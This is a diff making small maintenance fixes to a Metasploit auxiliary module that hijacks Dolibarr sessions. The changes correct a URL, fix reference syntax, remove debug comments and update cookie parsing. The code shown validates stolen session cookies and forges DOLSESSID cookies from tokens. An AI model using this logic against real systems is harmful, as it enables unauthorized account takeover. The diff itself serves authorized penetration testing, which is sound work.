@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -26,8 +26,8 @@ class Metasploit3 < Msf::Auxiliary
       'Author'         => 'Brendan Coles <bcoles[at]gmail.com>',
       'References'     =>
         [
-          ['URL'       => 'https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144'],
-          ['URL'       => 'https://github.com/Dolibarr/dolibarr/commit/8642e2027c840752c4357c4676af32fe342dc0cb']
+          ['URL', 'https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144'],
+          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/8642e2027c840752c4357c4676af32fe342dc0cb']
         ],
       'DisclosureDate' => 'Jan 12 2014'))
     register_options(
@@ -101,7 +101,6 @@ class Metasploit3 < Msf::Auxiliary
   # Verify if session cookie is valid and return user's ID
   #
   def get_user_id
-    # print_debug("#{peer} - Trying to hijack session '#{@cookie}'")
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
       'cookie'    => @cookie
@@ -121,14 +120,13 @@ class Metasploit3 < Msf::Auxiliary
   # Construct cookie using token
   #
   def create_cookie(token)
-    # print_debug("#{peer} - Creating a cookie with token '#{token}'")
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
       'cookie'    => "DOLSESSID_#{Rex::Text.rand_text_alphanumeric(10)}=#{token}"
     })
     if !res
       print_error("#{peer} - Connection failed")
-    elsif res.code == 200 and res.headers["set-cookie"] =~ /DOLSESSID_([a-f0-9]{32})=/
+    elsif res.code == 200 and res.get_cookies =~ /DOLSESSID_([a-f0-9]{32})=/
       return "DOLSESSID_#{$1}=#{token}"
     else
       print_warning("#{peer} - Could not create session cookie")
